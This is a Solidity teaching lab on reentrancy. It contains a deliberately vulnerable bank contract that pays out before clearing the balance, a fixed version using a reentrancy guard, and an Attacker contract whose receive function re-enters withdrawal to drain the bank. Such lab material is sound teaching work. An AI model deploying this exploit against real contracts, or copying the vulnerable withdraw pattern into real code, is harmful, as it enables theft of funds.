// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/// @title Lab 09 — Reentrancy: a vulnerable bank, the attack, and two fixes.
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        uint256 b = balances[msg.sender];
        (bool ok,) = msg.sender.call{value: b}(""); // BUG: interaction before effect
        require(ok);
        balances[msg.sender] = 0;
    }
}

contract FixedBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() external nonReentrant {
        uint256 b = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: b}("");
        require(ok);
    }
}

interface IBank {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    IBank public bank;

    constructor(IBank b) {
        bank = b;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdrawAll();
    }
}
